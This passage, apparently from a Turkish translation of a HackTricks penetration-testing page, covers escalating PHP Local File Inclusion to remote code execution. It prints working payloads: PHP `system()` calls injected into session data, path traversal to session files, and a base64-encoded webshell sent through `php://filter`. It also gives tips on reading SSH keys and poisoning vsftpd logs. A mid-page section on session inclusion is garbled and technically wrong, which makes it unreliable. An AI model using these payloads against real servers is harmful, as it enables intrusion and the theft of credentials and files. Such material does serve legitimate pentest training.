Set-Cookie: PHPSESSID=i56kgbsq9rm8ndg3qbarhsbm27; path=/
Set-Cookie: user=admin; expires=Mon, 13-Aug-2018 20:21:29 GMT; path=/; httponly
```
PHP'de bu oturumlar _/var/lib/php5/sess\\_\[PHPSESSID]\_ dosyalarına kaydedilir.
```
/var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm27.
user_ip|s:0:"";loggedin|s:0:"";lang|s:9:"en_us.php";win_lin|s:0:"";user|s:6:"admin";pass|s:6:"admin";
```
Çerez değerini `<?php system('cat /etc/passwd');?>` olarak ayarlayın.
```
login=1&user=<?php system("cat /etc/passwd");?>&pass=password&lang=en_us.php
```
# PHP Oturum Dosyasını Dahil Etmek İçin LFI Kullanımı

Bir web uygulamasında yer alan Local File Inclusion (LFI) zafiyeti, hedef sunucuda bulunan dosyaları dahil etmek için kullanılabilir. Bu zafiyetin bir örneği, PHP oturum dosyasını dahil etmek için kullanılabilir.

## Adım 1: Hedef Sunucunun LFI Zafiyetini Kontrol Etme

İlk adım olarak, hedef web uygulamasında LFI zafiyetinin varlığını kontrol etmemiz gerekmektedir. Bu zafiyet genellikle URL parametrelerinde veya dosya yollarında bulunabilir. Örnek bir URL parametresi şu şekilde olabilir:

```
http://example.com/page.php?file=example.txt
```

Bu URL'de `file` parametresi, hedef sunucuda bulunan `example.txt` dosyasını dahil etmek için kullanılıyor olabilir.

## Adım 2: PHP Oturum Dosyasını Dahil Etme

LFI zafiyetini kullanarak PHP oturum dosyasını dahil etmek için aşağıdaki adımları izleyebilirsiniz:

1. Hedef web uygulamasında LFI zafiyetinin bulunduğu URL'yi belirleyin. Örneğin:

   ```
   http://example.com/page.php?file=
   ```

2. URL'ye `php://input` ifadesini ekleyerek PHP oturum dosyasını dahil edin:

   ```
   http://example.com/page.php?file=php://input
   ```

3. Bir POST isteği göndererek PHP oturum dosyasını içeren bir veri gönderin. Örneğin:

   ```
   POST /page.php?file=php://input HTTP/1.1
   Host: example.com
   Content-Type: application/x-www-form-urlencoded
   Content-Length: 20

   <?php include('session.php'); ?>
   ```

   Bu istek, `session.php` dosyasını dahil ederek PHP oturumunu elde etmenizi sağlayacaktır.

## Sonuç

LFI zafiyeti kullanılarak PHP oturum dosyası dahil edilebilir. Bu, hedef web uygulamasının oturum yönetimini etkileyebilir ve yetkisiz erişim sağlayabilir. Bu nedenle, web uygulamalarının LFI zafiyetlerine karşı korunması önemlidir.
```
login=1&user=admin&pass=password&lang=/../../../../../../../../../var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm2
```
### SSH ile

Eğer ssh etkinse, hangi kullanıcının kullanıldığını kontrol edin (/proc/self/status & /etc/passwd) ve **\<HOME>/.ssh/id\_rsa**'ya erişmeyi deneyin.

### **vsftpd** _**logları**_ üzerinden

FTP sunucusu vsftpd için loglar **_/var/log/vsftpd.log_** konumundadır. Bir Yerel Dosya Dahil Etme (LFI) zafiyeti varsa ve açık bir vsftpd sunucusuna erişim mümkünse, aşağıdaki adımlar düşünülebilir:

1. Giriş işlemi sırasında kullanıcı adı alanına bir PHP payloadu enjekte edin.
2. Enjeksiyondan sonra, LFI'ı kullanarak **_/var/log/vsftpd.log_**'dan sunucu loglarını alın.

### PHP base64 filtresi ile (base64 kullanarak)

[Şu](https://matan-h.com/one-lfi-bypass-to-rule-them-all-using-base64) makalede gösterildiği gibi, PHP base64 filtresi sadece Base64 olmayanları görmezden gelir. Bu, dosya uzantısı kontrolünü atlatmak için kullanılabilir: ".php" ile biten bir base64 sağlarsanız, noktayı görmezden gelir ve base64'e "php" ekler. İşte bir örnek payload:
```url
http://example.com/index.php?page=PHP://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+.php

NOTE: the payload is "<?php system($_GET['cmd']);echo 'Shell done !'; ?>"
```
### Php filtreleri aracılığıyla (dosya gerekmez)

Bu [**yazıda**](https://gist.github.com/loknop/b27422d355ea1fd0d90d6dbc1e278d4d), çıktı olarak **keyfi içerik oluşturmak için php filtrelerini kullanabileceğinizi** açıklanmaktadır. Bu temel olarak, **bir dosyaya yazmadan** dahil etmek için **keyfi php kodu oluşturabileceğiniz** anlamına gelir.

{% content-ref url="lfi2rce-via-php-filters.md" %}
[lfi2rce-via-php-filters.md](lfi2rce-via-php-filters.md)
{% endcontent-ref %}

### Segmentasyon hatası aracılığıyla

Bir dosyayı **yükleyin** ve bu dosya `/tmp` dizininde **geçici olarak saklansın**, ardından **aynı istekte**, bir **segmentasyon hatası** tetikleyin ve ardından **geçici dosya silinmez** ve onu arayabilirsiniz.

{% content-ref url="lfi2rce-via-segmentation-fault.md" %}
[lfi2rce-via-segmentation-fault.md](lfi2rce-via-segmentation-fault.md)
{% endcontent-ref %}

### Nginx geçici dosya depolama aracılığıyla

Eğer bir **Yerel Dosya Dahil Etme** bulduysanız ve **Nginx**, PHP'nin önünde çalışıyorsa, aşağıdaki teknikle RCE elde edebilirsiniz:

{% content-ref url="lfi2rce-via-nginx-temp-files.md" %}
[lfi2rce-via-nginx-temp-files.md](lfi2rce-via-nginx-temp-files.md)
{% endcontent-ref %}

### PHP\_SESSION\_UPLOAD\_PROGRESS aracılığıyla

Bir **Yerel Dosya Dahil Etme** bulduysanız ve bir oturumunuz **yoksa** ve `session.auto_start` `Off` olarak ayarlanmışsa bile. **Multipart POST** verilerinde **`PHP_SESSION_UPLOAD_PROGRESS`** sağlarsanız, PHP oturumu **sizin için etkinleştirir**. Bunu kötüye kullanarak RCE elde edebilirsiniz:

{% content-ref url="via-php_session_upload_progress.md" %}
[via-php\_session\_upload\_progress.md](via-php\_session\_upload\_progress.md)
{% endcontent-ref %}

### Windows'ta geçici dosya yüklemeleri aracılığıyla

Bir **Yerel Dosya Dahil Etme** bulduysanız ve sunucu **Windows** üzerinde çalışıyorsa RCE elde edebilirsiniz:

{% content-ref url="lfi2rce-via-temp-file-uploads.md" %}
[lfi2rce-via-temp-file-uploads.md](lfi2rce-via-temp-file-uploads.md)
{% endcontent-ref %}

### phpinfo() (file\_uploads = on) aracılığıyla

Bir **Yerel Dosya Dahil Etme** bulduysanız ve file\_uploads = on olan bir dosya **phpinfo()** açığa çıkarıyorsa RCE elde edebilirsiniz:

{% content-ref url="lfi2rce-via-phpinfo.md" %}
[lfi2rce-via-phpinfo.md](lfi2rce-via-phpinfo.md)
{% endcontent-ref %}

### compress.zlib + `PHP_STREAM_PREFER_STUDIO` + Yol Açığını Kullanarak

Bir **Yerel Dosya Dahil Etme** bulduysanız ve geçici dosyanın yolunu **sızdırabiliyorsanız** ANCAK **sunucu**, **dahil edilecek dosyanın PHP işaretlerine sahip olup olmadığını kontrol ediyorsa**, bu **Yarış Koşulu** ile bu kontrolü **atlamayı** deneyebilirsiniz:

{% content-ref url="lfi2rce-via-compress.zlib-+-php_stream_prefer_studio-+-path-disclosure.md" %}
[lfi2rce-via-compress.zlib-+-php\_stream\_prefer\_studio-+-path-disclosure.md](lfi2rce-via-compress.zlib-+-php\_stream\_prefer\_studio-+-path-disclosure.md)
{% endcontent-ref %}

### Sonsuz bekleme + brute force aracılığıyla

LFI'yi **geçici dosyalar yüklemek** için kötüye kullanabilir ve sunucunun PHP yürütmesini **askıya alabilirsiniz**, ardından saatler boyunca geçici dosyayı bulmak için **brute force** yapabilirsiniz:

{% content-ref url="lfi2rce-via-eternal-waiting.md" %}
[lfi2rce-via-eternal-waiting.md](lfi2rce-via-eternal-waiting.md)
{% endcontent-ref %}

### Ölümcül Hata Yoluyla

`/usr/bin/phar`, `/usr/bin/phar7`, `/usr/bin/phar.phar7`, `/usr/bin/phar.phar` dosyalarından herhangi birini dahil ederseniz. (Bu hatayı atmak için aynı olanı 2 kez dahil etmeniz gerekmektedir).

**Bu nasıl kullanışlı olduğunu bilmiyorum ama olabilir.**\
_Eğer bir PHP Ölümcül Hatası oluşturursanız, yüklenen PHP geçici dosyaları silinir._

<figure><img src="../../.gitbook/assets/image (1) (5).png" alt=""><figcaption></figcaption></figure>

## Referanslar

* [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal)\
* [PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal/Intruders](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal/Intruders)

{% file src="../../.gitbook/assets/EN-Local-File-Inclusion-1.pdf" %}

<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

Deneyimli hackerlar ve hata avcıları ile iletişim kurmak için [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) sunucusuna katılın!

**Hacking Insights**\
Hacking'in heyecanını ve zorluklarını inceleyen içeriklerle etkileşime geçin

**Gerçek Zamanlı Hack Haberleri**\
Hızlı tempolu hacking dünyasını gerçek zamanlı haberler ve içgörülerle takip edin

**En Son Duyurular**\
Yeni hata avı ödülleri başlatma ve önemli platform güncellemeleri hakkında bilgi edinin

Bugün en iyi hackerlarla işbirliği yapmak için [**Discord**](https://discord.com/invite/N3FrSbmwdy)'a katılın!

<details>

<summary><strong>Sıfırdan kahraman olmak için AWS hackleme öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks'i desteklemenin diğer yolları:

* Şirketinizi HackTricks'te **reklam vermek veya HackTricks'i PDF olarak indirmek** için [**ABONELİK PLANLARI**](https://github.com/sponsors/carlospolop)'na göz atın!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* Özel [**NFT'lerden**](https://opensea.io/collection/the-peass-family) oluşan koleksiyonumuz olan [**The PEASS Family**](https://opensea.io/collection/the-peass-family)'yi keşfedin
* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katılın veya **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)'u takip edin.
* Hacking hilelerinizi göndererek HackTricks ve HackTricks Cloud github depolarına PR göndererek katkıda bulunun.

</details>
